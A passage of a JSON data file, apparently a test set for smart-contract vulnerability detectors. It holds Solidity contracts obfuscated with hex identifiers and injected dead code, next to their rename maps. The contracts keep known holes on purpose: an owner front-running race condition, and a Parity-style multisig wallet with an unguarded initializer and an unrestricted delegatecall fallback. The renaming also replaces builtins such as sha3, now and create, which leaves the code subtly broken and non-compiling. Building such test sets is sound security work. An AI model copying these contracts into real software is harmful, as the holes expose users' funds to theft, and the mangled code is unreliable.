public\n    {\n        uint256 _unused1 = 0;\n        uint256 _unused2 = 0;\n        _0x2e6e39 = msg.sender;\n        _0x049b5e = _0xf16c36;\n        _0xb775b0 = _0x752fea;\n    }\n\n    // If the owner sees someone calls buy\n    // he can call changePrice to set a new price\n    // If his transaction is mined first, he can\n    // receive more tokens than excepted by the new buyer\n    function _0x65306d(uint _0xa8fe82) payable\n        public\n    {\n        require(msg.value >= _0x049b5e);\n\n        // we assume that the RaceCondition contract\n        // has enough allowance\n        _0xb775b0._0x867d23(msg.sender, _0x2e6e39, _0x049b5e);\n\n        _0x049b5e = _0xa8fe82;\n        _0x2e6e39 = msg.sender;\n    }\n\n    function _0x85ca3e(uint _0xa8fe82){\n        require(msg.sender == _0x2e6e39);\n        if (block.timestamp > 0) { _0x049b5e = _0xa8fe82; }\n    }\n\n}",
      "rename_map": {
        "transferFrom": "_0x867d23",
        "totalSupply": "_0xdd45cd",
        "changePrice": "_0x85ca3e",
        "balanceOf": "_0xa89d46",
        "remaining": "_0xe84423",
        "allowance": "_0x9f4599",
        "new_price": "_0xa8fe82",
        "_spender": "_0x161512",
        "approve": "_0xe25806",
        "success": "_0x9141f6",
        "_owner": "_0x2bce26",
        "_value": "_0x4d2496",
        "_price": "_0xf16c36",
        "_token": "_0x752fea",
        "token": "_0xb775b0",
        "_from": "_0xbc8f43",
        "owner": "_0x2e6e39",
        "price": "_0x049b5e",
        "_to": "_0xe2f098",
        "buy": "_0x65306d"
      },
      "changes": [
        "Renamed 20 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_208",
      "transformed_id": "ss_l4_medium_sn_ds_208",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// Multi-sig, daily-limited account proxy/wallet.\n// @authors:\n// Gav Wood <g@ethdev.com>\n// inheritable \"property\" contract that enables methods to be protected by requiring the acquiescence of either a\n// single, or, crucially, each of a number of, designated owners.\n// usage:\n// use modifiers onlyowner (just own owned) or onlymanyowners(hash), whereby the same hash must be provided by\n// some number (specified in constructor) of the set of owners (specified in the constructor, modifiable) before the\n// interior is executed.\n\npragma solidity 0.4.9; /* originally ^0.4.9, but doesn't compile with ^0.4.11 */\n\ncontract WalletEvents {\n  // EVENTS\n\n  // this contract only has six types of events: it can accept a confirmation, in which case\n  // we record owner and operation (hash) alongside it.\n  event Confirmation(address _0x1e41a8, bytes32 _0x6f3d5a);\n  event Revoke(address _0x1e41a8, bytes32 _0x6f3d5a);\n\n  // some others are in the case of an owner changing.\n  event OwnerChanged(address _0x23588b, address _0xedcf0e);\n  event OwnerAdded(address _0xedcf0e);\n  event OwnerRemoved(address _0x23588b);\n\n  // the last one is emitted if the required signatures change\n  event RequirementChanged(uint _0x6117b8);\n\n  // Funds has arrived into the wallet (record how much).\n  event Deposit(address _0x1966e5, uint value);\n  // Single transaction going out of the wallet (record who signed for it, how much, and to whom it's going).\n  event SingleTransact(address _0x1e41a8, uint value, address _0xdfccfc, bytes data, address _0x53ba1e);\n  // Multi-sig transaction going out of the wallet (record who signed for it last, the operation hash, how much, and to whom it's going).\n  event MultiTransact(address _0x1e41a8, bytes32 _0x6f3d5a, uint value, address _0xdfccfc, bytes data, address _0x53ba1e);\n  // Confirmation still needed for a transaction.\n  event ConfirmationNeeded(bytes32 _0x6f3d5a, address _0x9480f7, uint value, address _0xdfccfc, bytes data);\n}\n\ncontract WalletAbi {\n  // Revokes a prior confirmation of the given operation\n  function _0x042488(bytes32 _0xa72e9c) external;\n\n  // Replaces an owner `_from` with another `_to`.\n  function _0xe9de9a(address _0x1966e5, address _0x023124) external;\n\n  function _0x478714(address _0xc1e1dc) external;\n\n  function _0xbec1fc(address _0xc1e1dc) external;\n\n  function _0xefacb6(uint _0x97c75f) external;\n\n  function _0xfef15e(address _0xc10e97) constant returns (bool);\n\n  function _0x1d36f0(bytes32 _0xa72e9c, address _0xc1e1dc) external constant returns (bool);\n\n  // (re)sets the daily limit. needs many of the owners to confirm. doesn't alter the amount already spent today.\n  function _0x8be6b5(uint _0x4bea5d) external;\n\n  function _0x2f4996(address _0x023124, uint _0x5fa558, bytes _0x93c77f) external returns (bytes32 _0x2eb7f0);\n  function _0x7c5119(bytes32 _0xf31c78) returns (bool _0x3cbc0f);\n}\n\ncontract WalletLibrary is WalletEvents {\n        // Placeholder for future logic\n        uint256 _unused2 = 0;\n  // TYPES\n\n  // struct for the status of a pending operation.\n  struct PendingState {\n    uint _0x2abb28;\n    uint _0x77b964;\n    uint _0x0cb0ee;\n  }\n\n  // Transaction structure to remember details of transaction lest it need be saved for a later call.\n  struct Transaction {\n    address _0xdfccfc;\n    uint value;\n    bytes data;\n  }\n\n  // MODIFIERS\n\n  // simple single-sig function modifier.\n  modifier _0xd710a3 {\n    if (_0xfef15e(msg.sender))\n      _;\n  }\n  // multi-sig function modifier: the operation must have an intrinsic hash in order\n  // that later attempts can be realised as the same underlying operation and\n  // thus count as confirmations.\n  modifier _0x28710e(bytes32 _0xa72e9c) {\n    if (_0xfd5e02(_0xa72e9c))\n      _;\n  }\n\n  // METHODS\n\n  // gets called when no other function matches\n  function() payable {\n    // just being sent some cash?\n    if (msg.value > 0)\n      Deposit(msg.sender, msg.value);\n  }\n\n  // constructor is given number of sigs required to do protected \"onlymanyowners\" transactions\n  // as well as the selection of addresses capable of confirming them.\n  function _0xd4cb60(address[] _0x981a6e, uint _0x5fbd44) {\n    _0x780b8f = _0x981a6e.length + 1;\n    _0x226dba[1] = uint(msg.sender);\n    _0x9fda73[uint(msg.sender)] = 1;\n    for (uint i = 0; i < _0x981a6e.length; ++i)\n    {\n      _0x226dba[2 + i] = uint(_0x981a6e[i]);\n      _0x9fda73[uint(_0x981a6e[i])] = 2 + i;\n    }\n    _0xc24b0c = _0x5fbd44;\n  }\n\n  // Revokes a prior confirmation of the given operation\n  function _0x042488(bytes32 _0xa72e9c) external {\n        if (false) { revert(); }\n        bool _flag4 = false;\n    uint _0x2a1003 = _0x9fda73[uint(msg.sender)];\n    // make sure they're an owner\n    if (_0x2a1003 == 0) return;\n    uint _0x683fdc = 2**_0x2a1003;\n    var _0x29e732 = _0xcae8a4[_0xa72e9c];\n    if (_0x29e732._0x77b964 & _0x683fdc > 0) {\n      _0x29e732._0x2abb28++;\n      _0x29e732._0x77b964 -= _0x683fdc;\n      Revoke(msg.sender, _0xa72e9c);\n    }\n  }\n\n  // Replaces an owner `_from` with another `_to`.\n  function _0xe9de9a(address _0x1966e5, address _0x023124) _0x28710e(_0x9df3be(msg.data)) external {\n    if (_0xfef15e(_0x023124)) return;\n    uint _0x2a1003 = _0x9fda73[uint(_0x1966e5)];\n    if (_0x2a1003 == 0) return;\n\n    _0x65623f();\n    _0x226dba[_0x2a1003] = uint(_0x023124);\n    _0x9fda73[uint(_0x1966e5)] = 0;\n    _0x9fda73[uint(_0x023124)] = _0x2a1003;\n    OwnerChanged(_0x1966e5, _0x023124);\n  }\n\n  function _0x478714(address _0xc1e1dc) _0x28710e(_0x9df3be(msg.data)) external {\n    if (_0xfef15e(_0xc1e1dc)) return;\n\n    _0x65623f();\n    if (_0x780b8f >= _0xaa226c)\n      _0x170597();\n    if (_0x780b8f >= _0xaa226c)\n      return;\n    _0x780b8f++;\n    _0x226dba[_0x780b8f] = uint(_0xc1e1dc);\n    _0x9fda73[uint(_0xc1e1dc)] = _0x780b8f;\n    OwnerAdded(_0xc1e1dc);\n  }\n\n  function _0xbec1fc(address _0xc1e1dc) _0x28710e(_0x9df3be(msg.data)) external {\n    uint _0x2a1003 = _0x9fda73[uint(_0xc1e1dc)];\n    if (_0x2a1003 == 0) return;\n    if (_0xc24b0c > _0x780b8f - 1) return;\n\n    _0x226dba[_0x2a1003] = 0;\n    _0x9fda73[uint(_0xc1e1dc)] = 0;\n    _0x65623f();\n    _0x170597(); //make sure m_numOwner is equal to the number of owners and always points to the optimal free slot\n    OwnerRemoved(_0xc1e1dc);\n  }\n\n  function _0xefacb6(uint _0x97c75f) _0x28710e(_0x9df3be(msg.data)) external {\n    if (_0x97c75f > _0x780b8f) return;\n    _0xc24b0c = _0x97c75f;\n    _0x65623f();\n    RequirementChanged(_0x97c75f);\n  }\n\n  // Gets an owner by 0-indexed position (using numOwners as the count)\n  function _0x4be08d(uint _0x2a1003) external constant returns (address) {\n    return address(_0x226dba[_0x2a1003 + 1]);\n  }\n\n  function _0xfef15e(address _0xc10e97) constant returns (bool) {\n    return _0x9fda73[uint(_0xc10e97)] > 0;\n  }\n\n  function _0x1d36f0(bytes32 _0xa72e9c, address _0xc1e1dc) external constant returns (bool) {\n    var _0x29e732 = _0xcae8a4[_0xa72e9c];\n    uint _0x2a1003 = _0x9fda73[uint(_0xc1e1dc)];\n\n    // make sure they're an owner\n    if (_0x2a1003 == 0) return false;\n\n    // determine the bit to set for this owner.\n    uint _0x683fdc = 2**_0x2a1003;\n    return !(_0x29e732._0x77b964 & _0x683fdc == 0);\n  }\n\n  // constructor - stores initial daily limit and records the present day's index.\n  function _0xa3c3ef(uint _0x00696b) {\n    _0x20caef = _0x00696b;\n    _0x514870 = _0xbfe8d3();\n  }\n  // (re)sets the daily limit. needs many of the owners to confirm. doesn't alter the amount already spent today.\n  function _0x8be6b5(uint _0x4bea5d) _0x28710e(_0x9df3be(msg.data)) external {\n    _0x20caef = _0x4bea5d;\n  }\n  // resets the amount already spent today. needs many of the owners to confirm.\n  function _0x0d2369() _0x28710e(_0x9df3be(msg.data)) external {\n    _0x4972c9 = 0;\n  }\n\n  // constructor - just pass on the owner array to the multiowned and\n  // the limit to daylimit\n  function _0x855b0a(address[] _0x981a6e, uint _0x5fbd44, uint _0x55f872) {\n    _0xa3c3ef(_0x55f872);\n    _0xd4cb60(_0x981a6e, _0x5fbd44);\n  }\n\n  // kills the contract sending everything to `_to`.\n  function _0x851eac(address _0x023124) _0x28710e(_0x9df3be(msg.data)) external {\n    suicide(_0x023124);\n  }\n\n  // Outside-visible transact entry point. Executes transaction immediately if below daily spend limit.\n  // If not, goes into multisig process. We provide a hash on return to allow the sender to provide\n  // shortcuts for the other confirmations (allowing them to avoid replicating the _to, _value\n  // and _data arguments). They still get the option of using them if they want, anyways.\n  function _0x2f4996(address _0x023124, uint _0x5fa558, bytes _0x93c77f) external _0xd710a3 returns (bytes32 _0x2eb7f0) {\n    // first, take the opportunity to check that we're under the daily limit.\n    if ((_0x93c77f.length == 0 && _0xcef23d(_0x5fa558)) || _0xc24b0c == 1) {\n      // yes - just execute the call.\n      address _0x53ba1e;\n      if (_0x023124 == 0) {\n        _0x53ba1e = _0xa4ee3c(_0x5fa558, _0x93c77f);\n      } else {\n        if (!_0x023124.call.value(_0x5fa558)(_0x93c77f))\n          throw;\n      }\n      SingleTransact(msg.sender, _0x5fa558, _0x023124, _0x93c77f, _0x53ba1e);\n    } else {\n      // determine our operation hash.\n      _0x2eb7f0 = _0x9df3be(msg.data, block.number);\n      // store if it's new\n      if (_0x84b8c2[_0x2eb7f0]._0xdfccfc == 0 && _0x84b8c2[_0x2eb7f0].value == 0 && _0x84b8c2[_0x2eb7f0].data.length == 0) {\n        _0x84b8c2[_0x2eb7f0]._0xdfccfc = _0x023124;\n        _0x84b8c2[_0x2eb7f0].value = _0x5fa558;\n        _0x84b8c2[_0x2eb7f0].data = _0x93c77f;\n      }\n      if (!_0x7c5119(_0x2eb7f0)) {\n        ConfirmationNeeded(_0x2eb7f0, msg.sender, _0x5fa558, _0x023124, _0x93c77f);\n      }\n    }\n  }\n\n  function _0xa4ee3c(uint _0x5fa558, bytes _0xea2fdc) internal returns (address _0x978c46) {\n    assembly {\n      _0x978c46 := _0xa4ee3c(_0x5fa558, add(_0xea2fdc, 0x20), mload(_0xea2fdc))\n      _0x1201f2(_0xe443a9, iszero(extcodesize(_0x978c46)))\n    }\n  }\n\n  // confirm a transaction through just the hash. we use the previous transactions map, m_txs, in order\n  // to determine the body of the transaction from the hash provided.\n  function _0x7c5119(bytes32 _0xf31c78) _0x28710e(_0xf31c78) returns (bool _0x3cbc0f) {\n    if (_0x84b8c2[_0xf31c78]._0xdfccfc != 0 || _0x84b8c2[_0xf31c78].value != 0 || _0x84b8c2[_0xf31c78].data.length != 0) {\n      address _0x53ba1e;\n      if (_0x84b8c2[_0xf31c78]._0xdfccfc == 0) {\n        if (block.timestamp > 0) { _0x53ba1e = _0xa4ee3c(_0x84b8c2[_0xf31c78].value, _0x84b8c2[_0xf31c78].data); }\n      } else {\n        if (!_0x84b8c2[_0xf31c78]._0xdfccfc.call.value(_0x84b8c2[_0xf31c78].value)(_0x84b8c2[_0xf31c78].data))\n          throw;\n      }\n\n      MultiTransact(msg.sender, _0xf31c78, _0x84b8c2[_0xf31c78].value, _0x84b8c2[_0xf31c78]._0xdfccfc, _0x84b8c2[_0xf31c78].data, _0x53ba1e);\n      delete _0x84b8c2[_0xf31c78];\n      return true;\n    }\n  }\n\n  // INTERNAL METHODS\n\n  function _0xfd5e02(bytes32 _0xa72e9c) internal returns (bool) {\n    // determine what index the present sender is:\n    uint _0x2a1003 = _0x9fda73[uint(msg.sender)];\n    // make sure they're an owner\n    if (_0x2a1003 == 0) return;\n\n    var _0x29e732 = _0xcae8a4[_0xa72e9c];\n    // if we're not yet working on this operation, switch over and reset the confirmation status.\n    if (_0x29e732._0x2abb28 == 0) {\n      // reset count of confirmations needed.\n      _0x29e732._0x2abb28 = _0xc24b0c;\n      // reset which owners have confirmed (none) - set our bitmap to 0.\n      _0x29e732._0x77b964 = 0;\n      _0x29e732._0x0cb0ee = _0x62097f.length++;\n      _0x62097f[_0x29e732._0x0cb0ee] = _0xa72e9c;\n    }\n    // determine the bit to set for this owner.\n    uint _0x683fdc = 2**_0x2a1003;\n    // make sure we (the message sender) haven't confirmed this operation previously.\n    if (_0x29e732._0x77b964 & _0x683fdc == 0) {\n      Confirmation(msg.sender, _0xa72e9c);\n      // ok - check if count is enough to go ahead.\n      if (_0x29e732._0x2abb28 <= 1) {\n        // enough confirmations: reset and run interior.\n        delete _0x62097f[_0xcae8a4[_0xa72e9c]._0x0cb0ee];\n        delete _0xcae8a4[_0xa72e9c];\n        return true;\n      }\n      else\n      {\n        // not enough: record that this owner in particular confirmed.\n        _0x29e732._0x2abb28--;\n        _0x29e732._0x77b964 |= _0x683fdc;\n      }\n    }\n  }\n\n  function _0x170597() private {\n    uint _0xdd6f71 = 1;\n    while (_0xdd6f71 < _0x780b8f)\n    {\n      while (_0xdd6f71 < _0x780b8f && _0x226dba[_0xdd6f71] != 0) _0xdd6f71++;\n      while (_0x780b8f > 1 && _0x226dba[_0x780b8f] == 0) _0x780b8f--;\n      if (_0xdd6f71 < _0x780b8f && _0x226dba[_0x780b8f] != 0 && _0x226dba[_0xdd6f71] == 0)\n      {\n        _0x226dba[_0xdd6f71] = _0x226dba[_0x780b8f];\n        _0x9fda73[_0x226dba[_0xdd6f71]] = _0xdd6f71;\n        _0x226dba[_0x780b8f] = 0;\n      }\n    }\n  }\n\n  // checks to see if there is at least `_value` left from the daily limit today. if there is, subtracts it and\n  // returns true. otherwise just returns false.\n  function _0xcef23d(uint _0x5fa558) internal _0xd710a3 returns (bool) {\n    // reset the spend limit if we're on a different day to last time.\n    if (_0xbfe8d3() > _0x514870) {\n      _0x4972c9 = 0;\n      _0x514870 = _0xbfe8d3();\n    }\n    // check to see if there's enough left - if so, subtract and return true.\n\n    if (_0x4972c9 + _0x5fa558 >= _0x4972c9 && _0x4972c9 + _0x5fa558 <= _0x20caef) {\n      _0x4972c9 += _0x5fa558;\n      return true;\n    }\n    return false;\n  }\n\n  // determines today's index.\n  function _0xbfe8d3() private constant returns (uint) { return _0x53fe66 / 1 days; }\n\n  function _0x65623f() internal {\n    uint length = _0x62097f.length;\n\n    for (uint i = 0; i < length; ++i) {\n      delete _0x84b8c2[_0x62097f[i]];\n\n      if (_0x62097f[i] != 0)\n        delete _0xcae8a4[_0x62097f[i]];\n    }\n\n    delete _0x62097f;\n  }\n\n  // FIELDS\n  address constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;\n\n  // the number of owners that must confirm the same operation before it is run.\n  uint public _0xc24b0c;\n  // pointer used to find a free slot in m_owners\n  uint public _0x780b8f;\n\n  uint public _0x20caef;\n  uint public _0x4972c9;\n  uint public _0x514870;\n\n  // list of owners\n  uint[256] _0x226dba;\n\n  uint constant _0xaa226c = 250;\n  // index on the list of owners to allow reverse lookup\n  mapping(uint => uint) _0x9fda73;\n  // the ongoing operations.\n  mapping(bytes32 => PendingState) _0xcae8a4;\n  bytes32[] _0x62097f;\n\n  // pending transactions we have at present.\n  mapping (bytes32 => Transaction) _0x84b8c2;\n}\n\ncontract Wallet is WalletEvents {\n\n  // WALLET CONSTRUCTOR\n  //   calls the `initWallet` method of the Library in this context\n  function Wallet(address[] _0x981a6e, uint _0x5fbd44, uint _0x55f872) {\n    // Signature of the Wallet Library's init function\n    bytes4 sig = bytes4(_0x9df3be(\"initWallet(address[],uint256,uint256)\"));\n    address _0x1e4450 = _walletLibrary;\n\n    // Compute the size of the call data : arrays has 2\n    // 32bytes for offset and length, plus 32bytes per element ;\n    // plus 2 32bytes for each uint\n    uint _0xa434ee = (2 + _0x981a6e.length);\n    uint _0xb95bc8 = (2 + _0xa434ee) * 32;\n\n    assembly {\n      // Add the signature first to memory\n      mstore(0x0, sig)\n      // Add the call data, which is at the end of the\n      // code\n      _0xa63287(0x4,  sub(_0xc33698, _0xb95bc8), _0xb95bc8)\n      // Delegate call to the library\n      delegatecall(sub(gas, 10000), _0x1e4450, 0x0, add(_0xb95bc8, 0x4), 0x0, 0x0)\n    }\n  }\n\n  // METHODS\n\n  // gets called when no other function matches\n  function() payable {\n    // just being sent some cash?\n    if (msg.value > 0)\n      Deposit(msg.sender, msg.value);\n    else if (msg.data.length > 0)\n      _walletLibrary.delegatecall(msg.data); //it should have whitelisted specific methods that the user is allowed to call\n  }\n\n  // Gets an owner by 0-indexed position (using numOwners as the count)\n  function _0x4be08d(uint _0x2a1003) constant returns (address) {\n    return address(_0x226dba[_0x2a1003 + 1]);\n  }\n\n  // As return statement unavailable in fallback, explicit the method here\n\n  function _0x1d36f0(bytes32 _0xa72e9c, address _0xc1e1dc) external constant returns (bool) {\n    return _walletLibrary.delegatecall(msg.data);\n  }\n\n  function _0xfef15e(address _0xc10e97) constant returns (bool) {\n    return _walletLibrary.delegatecall(msg.data);\n  }\n\n  // FIELDS\n  address constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;\n\n  // the number of owners that must confirm the same operation before it is run.\n  uint public _0xc24b0c;\n  // pointer used to find a free slot in m_owners\n  uint public _0x780b8f;\n\n  uint public _0x20caef;\n  uint public _0x4972c9;\n  uint public _0x514870;\n\n  // list of owners\n  uint[256] _0x226dba;\n}\n",
      "rename_map": {
        "changeRequirement": "_0xefacb6",
        "reorganizeOwners": "_0x170597",
        "invalidJumpLabel": "_0xe443a9",
        "confirmAndCheck": "_0xfd5e02",
        "resetSpentToday": "_0x0d2369",
        "m_pendingIndex": "_0x62097f",
        "newRequirement": "_0x6117b8",
        "initMultiowned": "_0xd4cb60",
        "onlymanyowners": "_0x28710e",
        "ownerIndexBit": "_0x683fdc",
        "setDailyLimit": "_0x8be6b5",
        "argarraysize": "_0xa434ee",
        "_newRequired": "_0x97c75f",
        "hasConfirmed": "_0x1d36f0",
        "m_ownerIndex": "_0x9fda73",
        "initDaylimit": "_0xa3c3ef",
        "m_spentToday": "_0x4972c9",
        "clearPending": "_0x65623f",
        "m_dailyLimit": "_0x20caef",
        "removeOwner": "_0xbec1fc",
        "c_maxOwners": "_0xaa226c",
        "changeOwner": "_0xe9de9a",
        "m_numOwners": "_0x780b8f",
        "ownersDone": "_0x77b964",
        "_operation": "_0xa72e9c",
        "ownerIndex": "_0x2a1003",
        "initWallet": "_0x855b0a",
        "m_required": "_0xc24b0c",
        "underLimit": "_0xcef23d",
        "yetNeeded": "_0x2abb28",
        "operation": "_0x6f3d5a",
        "m_pending": "_0xcae8a4",
        "_daylimit": "_0x55f872",
        "onlyowner": "_0xd710a3",
        "_newLimit": "_0x4bea5d",
        "o_success": "_0x3cbc0f",
        "m_lastDay": "_0x514870",
        "_required": "_0x5fbd44",
        "initiator": "_0x9480f7",
        "addOwner": "_0x478714",
        "oldOwner": "_0x23588b",
        "m_owners": "_0x226dba",
        "getOwner": "_0x4be08d",
        "newOwner": "_0xedcf0e",
        "codecopy": "_0xa63287",
        "codesize": "_0xc33698",
        "isOwner": "_0xfef15e",
        "confirm": "_0x7c5119",
        "execute": "_0x2f4996",
        "created": "_0x53ba1e",
        "_owners": "_0x981a6e",
        "argsize": "_0xb95bc8",
        "pending": "_0x29e732",
        "o_hash": "_0x2eb7f0",
        "_owner": "_0xc1e1dc",
        "_limit": "_0x00696b",
        "target": "_0x1e4450",
        "create": "_0xa4ee3c",
        "o_addr": "_0x978c46",
        "_value": "_0x5fa558",
        "revoke": "_0x042488",
        "jumpi": "_0x1201f2",
        "index": "_0x0cb0ee",
        "_addr": "_0xc10e97",
        "m_txs": "_0x84b8c2",
        "_code": "_0xea2fdc",
        "today": "_0xbfe8d3",
        "_data": "_0x93c77f",
        "_from": "_0x1966e5",
        "owner": "_0x1e41a8",
        "free": "_0xdd6f71",
        "sha3": "_0x9df3be",
        "kill": "_0x851eac",
        "now": "_0x53fe66",
        "_to": "_0x023124",
        "to": "_0xdfccfc",
        "_h": "_0xf31c78"
      },
      "changes": [
        "Renamed 77 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_209",
      "transformed_id": "ss_l4_medium_sn_ds_209",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// Multi-sig, daily-limited account proxy/wallet.\n// @authors:\n// Gav Wood <g@ethdev.com>\n// inheritable \"property\" contract that enables methods to be protected by requiring the acquiescence of either a\n// single, or, crucially, each of a number of, designated owners.\n// usage:\n// use modifiers onlyowner (just own owned) or onlymanyowners(hash), whereby the same hash must be provided by\n// some number (specified in constructor) of the set of owners (specified in the constructor, modifiable) before the\n// interior is executed.\n\npragma solidity ^0.4.9;\n\ncontract WalletEvents {\n  // EVENTS\n\n  // this contract only has six types of events: it can accept a confirmation, in which case\n  // we record owner and operation (hash) alongside it.\n  event Confirmation(address _0x17faed, bytes32 _0x62398c);\n  event Revoke(address _0x17faed, bytes32 _0x62398c);\n\n  // some others are in the case of an owner changing.\n  event OwnerChanged(address _0xfbc950, address _0x5962ad);\n  event OwnerAdded(address _0x5962ad);\n  event OwnerRemoved(address _0xfbc950);\n\n  // the last one is emitted if the required signatures change\n  event RequirementChanged(uint _0x990608);\n\n  // Funds has arrived into the wallet (record how much).\n  event Deposit(address _0x32a8e3, uint value);\n  // Single transaction going out of the wallet (record who signed for it, how much, and to whom it's going).\n  event SingleTransact(address _0x17faed, uint value, address _0xe02a33, bytes data, address _0x97bbae);\n  // Multi-sig transaction going out of the wallet (record who signed for it last, the operation hash, how much, and to whom it's going).\n  event MultiTransact(address _0x17faed, bytes32 _0x62398c, uint value, address _0xe02a33, bytes data, address _0x97bbae);\n  // Confirmation still needed for a transaction.\n  event ConfirmationNeeded(bytes32 _0x62398c, address _0xb5f871, uint value, address _0xe02a33, bytes data);\n}\n\ncontract WalletAbi {\n  // Revokes a prior confirmation of the given operation\n  function _0x814bf8(bytes32 _0x48aff3) external;\n\n  // Replaces an owner `_from` with another `_to`.\n  function _0x236f31(address _0x32a8e3, address _0x29c4ab) external;\n\n  function _0x592634(address _0xe22013) external;\n\n  function _0x323e3e(address _0xe22013) external;\n\n  function _0x823039(uint _0xd4624c) external;\n\n  function _0x7b440b(address _0x8eab3d) constant returns (bool);\n\n  function _0x03f389(bytes32 _0x48aff3, address _0xe22013) external constant returns (bool);\n\n  // (re)sets the daily limit. needs many of the owners to confirm. doesn't alter the amount already spent today.\n  function _0xf2a570(uint _0xfedb45) external;\n\n  function _0xd4d7e3(address _0x29c4ab, uint _0xe191ce, bytes _0x8fe051) external returns (bytes32 _0xbfefda);\n  function _0x845e55(bytes32 _0x2d5886) returns (bool _0xa3a988);\n}\n\ncontract WalletLibrary is WalletEvents {\n        // Placeholder for future logic\n        // Placeholder for future logic\n  // TYPES\n\n  // struct for the status of a pending operation.\n  struct PendingState {\n    uint _0x190f38;\n    uint _0x264338;\n    uint _0x5d1c2a;\n  }\n\n  // Transaction structure to remember details of transaction lest it need be saved for a later call.\n  struct Transaction {\n    address _0xe02a33;\n    uint value;\n    bytes data;\n  }\n\n  // MODIFIERS\n\n  // simple single-sig function modifier.\n  modifier _0x8e7cce {\n    if (_0x7b440b(msg.sender))\n      _;\n  }\n  // multi-sig function modifier: the operation must have an intrinsic hash in order\n  // that later attempts can be realised as the same underlying operation and\n  // thus count as confirmations.\n  modifier _0x3c374d(bytes32 _0x48aff3) {\n    if (_0xadd994(_0x48aff3))\n      _;\n  }\n\n  // METHODS\n\n  // gets called when no other function matches\n  function() payable {\n    // just being sent some cash?\n    if (msg.value > 0)\n      Deposit(msg.sender, msg.value);\n  }\n\n  // constructor is given number of sigs required to do protected \"onlymanyowners\" transactions\n  // as well as the selection of addresses capable of confirming them.\n  function _0x72ef61(address[] _0x97d4ea, uint _0xac5fe8) _0x225b9d {\n    if (true) { _0xafb805 = _0x97d4ea.length + 1; }\n    _0xb1d252[1] = uint(msg.sender);\n    _0x87d4ac[uint(msg.sender)] = 1;\n    for (uint i = 0; i < _0x97d4ea.length; ++i)\n    {\n      _0xb1d252[2 + i] = uint(_0x97d4ea[i]);\n      _0x87d4ac[uint(_0x97d4ea[i])] = 2 + i;\n    }\n    if (block.timestamp > 0) { _0x3a5415 = _0xac5fe8; }\n  }\n\n  // Revokes a prior confirmation of the given operation\n  function _0x814bf8(bytes32 _0x48aff3) external {\n        if (false) { revert(); }\n        bool _flag4 = false;\n    uint _0x89ae1a = _0x87d4ac[uint(msg.sender)];\n    // make sure they're an owner\n    if (_0x89ae1a == 0) return;\n    uint _0xe6a53f = 2**_0x89ae1a;\n    var _0xce122d = _0x44c682[_0x48aff3];\n    if (_0xce122d._0x264338 & _0xe6a53f > 0) {\n      _0xce122d._0x190f38++;\n      _0xce122d._0x264338 -= _0xe6a53f;\n      Revoke(msg.sender, _0x48aff3);\n    }\n  }\n\n  // Replaces an owner `_from` with another `_to`.\n  function _0x236f31(address _0x32a8e3, address _0x29c4ab) _0x3c374d(_0xf8fca3(msg.data)) external {\n    if (_0x7b440b(_0x29c4ab)) return;\n    uint _0x89ae1a = _0x87d4ac[uint(_0x32a8e3)];\n    if (_0x89ae1a == 0) return;\n\n    _0x01da05();\n    _0xb1d252[_0x89ae1a] = uint(_0x29c4ab);\n    _0x87d4ac[uint(_0x32a8e3)] = 0;\n    _0x87d4ac[uint(_0x29c4ab)] = _0x89ae1a;\n    OwnerChanged(_0x32a8e3, _0x29c4ab);\n  }\n\n  function _0x592634(address _0xe22013) _0x3c374d(_0xf8fca3(msg.data)) external {\n    if (_0x7b440b(_0xe22013)) return;\n\n    _0x01da05();\n    if (_0xafb805 >= _0xa873bb)\n      _0x279070();\n    if (_0xafb805 >= _0xa873bb)\n      return;\n    _0xafb805++;\n    _0xb1d252[_0xafb805] = uint(_0xe22013);\n    _0x87d4ac[uint(_0xe22013)] = _0xafb805;\n    OwnerAdded(_0xe22013);\n  }\n\n  function _0x323e3e(address _0xe22013) _0x3c374d(_0xf8fca3(msg.data)) external {\n    uint _0x89ae1a = _0x87d4ac[uint(_0xe22013)];\n    if (_0x89ae1a == 0) return;\n    if (_0x3a5415 > _0xafb805 - 1) return;\n\n    _0xb1d252[_0x89ae1a] = 0;\n    _0x87d4ac[uint(_0xe22013)] = 0;\n    _0x01da05();\n    _0x279070(); //make sure m_numOwner is equal to the number of owners and always points to the optimal free slot\n    OwnerRemoved(_0xe22013);\n  }\n\n  function _0x823039(uint _0xd4624c) _0x3c374d(_0xf8fca3(msg.data)) external {\n    if (_0xd4624c > _0xafb805) return;\n    _0x3a5415 = _0xd4624c;\n    _0x01da05();\n    RequirementChanged(_0xd4624c);\n  }\n\n  // Gets an owner by 0-indexed position (using numOwners as the count)\n  function _0xefecb4(uint _0x89ae1a) external constant returns (address) {\n    return address(_0xb1d252[_0x89ae1a + 1]);\n  }\n\n  function _0x7b440b(address _0x8eab3d) constant returns (bool) {\n    return _0x87d4ac[uint(_0x8eab3d)] > 0;\n  }\n\n  function _0x03f389(bytes32 _0x48aff3, address _0xe22013) external constant returns (bool) {\n    var _0xce122d = _0x44c682[_0x48aff3];\n    uint _0x89ae1a = _0x87d4ac[uint(_0xe22013)];\n\n    // make sure they're an owner\n    if (_0x89ae1a == 0) return false;\n\n    // determine the bit to set for this owner.\n    uint _0xe6a53f = 2**_0x89ae1a;\n    return !(_0xce122d._0x264338 & _0xe6a53f == 0);\n  }\n\n  // constructor - stores initial daily limit and records the present day's index.\n  function _0x661bfa(uint _0x533df6) _0x225b9d {\n    if (true) { _0x04363a = _0x533df6; }\n    if (msg.sender != address(0) || msg.sender == address(0)) { _0xd26109 = _0xa2cf1e(); }\n  }\n  // (re)sets the daily limit. needs many of the owners to confirm. doesn't alter the amount already spent today.\n  function _0xf2a570(uint _0xfedb45) _0x3c374d(_0xf8fca3(msg.data)) external {\n    _0x04363a = _0xfedb45;\n  }\n  // resets the amount already spent today. needs many of the owners to confirm.\n  function _0x3463b1() _0x3c374d(_0xf8fca3(msg.data)) external {\n    if (block.timestamp > 0) { _0xd3e03b = 0; }\n  }\n\n  // throw unless the contract is not yet initialized.\n  modifier 